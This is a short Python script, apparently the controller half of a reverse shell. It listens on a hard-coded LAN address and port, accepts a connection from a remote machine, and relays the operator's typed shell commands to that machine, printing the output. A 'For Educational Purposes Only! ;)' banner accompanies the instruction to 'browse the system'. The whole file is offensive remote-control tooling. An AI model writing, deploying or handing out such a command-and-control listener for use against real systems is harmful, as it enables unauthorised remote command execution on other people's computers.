import socket

def server(address):
    try:
        s = socket.socket()
        s.bind(address)
        s.listen()
        print("Server Initializad. I'm listening...")
    except Exception as e:
        print("\nIt seems like something went wrong.")
        print(e)
        restart = input("\nDo you want me to reinitialize the server? y/n ")
        if restart.lower() == 'y' or restart.lower() == 'yes':
            print("\nRoger That. Reinitializing the server...\n")
            server(address)
        else:
            print("\nSo Long, and Thanks for All the finish.\n")
            exit()
    conn, client_addr = s.accept()
    print(f"Connection Established: {client_addr}")
    send_commands(s, conn)


def send_commands(s, conn):
    print("\nCtrl + C to kill the connection.")
    print("Browse the system a usual.")
    print("For Educational Purposes Only! ;)\n")
    print("$: ", end="")
    while True:
        try:
            cmd = input()
            if len(cmd) > 0:
                conn.sendall(cmd.encode())
                data = conn.recv(1024)
                print(data.decode("utf-8"), end="")
        except KeyboardInterrupt:
            print("\nGoodbye.")
            conn.close()
            s.close()
            exit()
        except Exception as e:
            print(e)
            conn.close()
            s.close()
            exit()

if __name__ == "__main__":
    host = '192.168.100.17'
    port = 19876
    server((host, port))